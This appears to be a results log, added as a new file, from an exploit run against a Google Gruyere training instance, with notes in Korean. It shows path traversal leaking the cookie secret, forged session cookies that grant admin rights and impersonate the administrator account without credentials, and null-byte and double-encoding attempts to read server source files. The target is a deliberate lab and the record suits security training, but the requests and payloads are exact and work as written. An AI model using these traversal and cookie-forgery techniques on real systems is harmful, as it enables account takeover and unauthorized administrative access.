@@ -1,0 +1,43 @@
+GID=399820027374159079597995648128134925001
+BASE=https://google-gruyere.appspot.com/399820027374159079597995648128134925001
+
+### 1) 경로이탈로 cookie_secret 탈취
+GET /%2e%2e%2fsecret.txt → 'Cookie!\n'
+cookie_secret 으로 사용: 'Cookie!\n'
+
+### 2) 서명 재현 검증 (대조군)
+  cookie_data='brie||author'           재현=  74315992 실측=  74315992 일치
+  cookie_data='administrator|admin|'   재현=  31131337 실측=  31131337 일치
+  cookie_data='cheddar||author'        재현=  40461140 실측=  40461140 일치
+  cookie_data='sardo||author'          재현=  22005508 실측=  22005508 일치
+
+### 3) 위조 쿠키 검증 (읽기 전용 GET)
+
+  --- 내 테스트 계정(brie)에 admin 승격
+      Cookie: GRUYERE=72819616|brie|admin|author
+      /dump.gtl 이 서버가 파싱한 쿠키: {'is_admin': True, 'is_author': True, 'uid': u'brie'}
+      /manage.gtl 관리자 링크 노출: True
+      /newaccount.gtl 관리자 전용 is_admin 라디오: True
+      /editprofile.gtl 관리자 전용 UI: True
+
+  --- administrator 계정 사칭(자격증명 없이)
+      Cookie: GRUYERE=65692386|administrator|admin|author
+      /dump.gtl 이 서버가 파싱한 쿠키: {'is_admin': True, 'is_author': True, 'uid': u'administrator'}
+      /manage.gtl 관리자 링크 노출: True
+      /newaccount.gtl 관리자 전용 is_admin 라디오: True
+      /editprofile.gtl 관리자 전용 UI: True
+      >>> 관리자 권한 획득 확인: True
+
+  --- is_admin 플래그를 빈 값으로 (대조군)
+      Cookie: GRUYERE=36184618|administrator||author
+      /dump.gtl 이 서버가 파싱한 쿠키: {'is_admin': False, 'is_author': True, 'uid': u'administrator'}
+      /manage.gtl 관리자 링크 노출: False
+      /newaccount.gtl 관리자 전용 is_admin 라디오: False
+      /editprofile.gtl 관리자 전용 UI: False
+
+### 4) 확장자 화이트리스트 우회 변형 (.py/.yaml/.bak 읽기 시도)
+  null byte 로 .py 위장         /%2e%2e%2fdata.py%00.txt           → len=248  '<HTML><BODY>\n        <H1 style="color:red">Gruyere System Alert</H1>\n '
+  null byte 로 .bak 위장        /%2e%2e%2fapp.yaml%00.txt          → len=248  '<HTML><BODY>\n        <H1 style="color:red">Gruyere System Alert</H1>\n '
+  trailing dot+txt           /%2e%2e%2fdata.py.txt              → Invalid request  '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">\n<!-- C'
+  이중 인코딩 %252e               /%252e%252e%252fdata.py.txt        → Invalid request  '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">\n<!-- C'
+  대문자 확장자                    /%2e%2e%2fDATA.PY.txt              → Invalid request  '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">\n<!-- C'
